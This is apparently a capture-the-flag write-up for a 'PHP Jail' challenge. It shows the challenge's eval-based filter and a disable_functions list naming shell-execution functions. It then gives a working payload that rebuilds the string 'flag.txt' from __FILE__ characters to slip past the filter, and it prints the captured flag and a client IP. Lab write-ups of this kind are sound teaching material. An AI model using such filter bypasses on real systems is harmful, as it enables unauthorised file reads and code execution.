@@ -1,0 +1,78 @@
+Challenge PHP code:
+-----------------------------
+
+WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
+The php.ini file contain "disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file"
+
+<?php
+array_shift($_SERVER['argv']);
+$var = implode(" ", $_SERVER['argv']);
+
+if($var == null) die("PHP Jail need an argument\n");
+
+function filter($var) {
+        if(preg_match('/(\'|\"|`|\.|\$|\/|a|c|s|require|include)/i', $var)) {
+                return false;
+        }
+        return true;
+}
+if(filter($var)) {
+        eval($var);
+        echo "Command executed";
+} else {
+        echo "Restricted characters has been used";
+}
+echo "\n";
+?>
+
+-----------------------------
+
+He the challenge is that we can't use ' or ". We can't form a string so we can't retrieve the file name.
+
+The highlight_file command seem to still be working.
+
+We can't simply write highlight_file('flag.txt') because 'a' is restricted and '...
+
+We need to find a way to construct a string
+
+From phpinfo we get the following env variables :
+TERM => xterm-256color
+SHELL => /home/level4/prompt.sh
+SSH_CLIENT => 142.169.78.105 25841 22
+SSH_TTY => /dev/pts/5
+USER => level4
+MAIL => /var/mail/level4
+PATH => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+PWD => /home/level4
+LANG => en_CA.UTF-8
+SHLVL => 1
+HOME => /home/level4
+LOGNAME => level4
+SSH_CONNECTION => 142.169.78.105 25841 10.0.3.29 22
+_ => /usr/bin/php
+
+apparently, in php, if you do print(somestringWithoutQuotes), php will use it as a string.
+
+the variable __FILE__ contains "/home/level4/jail.php"
+
+We can retrieve some characters from there.
+Doesn't seem like it's a normal string, we can't __FILE__[IDX]
+
+We explode it using the / in getenv(HOME) and we can retrieve the 'a' character :
+print(explode(getenv(HOME)[0], __FILE__)[3][1]);
+
+we get the '.' character from:
+print(explode(getenv(HOME)[0], __FILE__)[3][4]);
+
+We can join the string using implode but we need the '' to join the string :
+print(explode(getenv(HOME)[0], __FILE__)[3][0]);
+
+We get flag.txt from:
+print(implode(explode(getenv(HOME)[0], __FILE__)[0], [fl, explode(getenv(HOME)[0], __FILE__)[3][1], g, explode(getenv(HOME)[0], __FILE__)[3][4], txt]));
+
+
+Finally we read the file using highlight_file :
+print(highlight_file(implode(explode(getenv(HOME)[0], __FILE__)[0], [fl, explode(getenv(HOME)[0], __FILE__)[3][1], g, explode(getenv(HOME)[0], __FILE__)[3][4], txt])));
+
+Which give the flag :
+FLAG-X9uF51b0X570f616897kLN3It3K6m63c
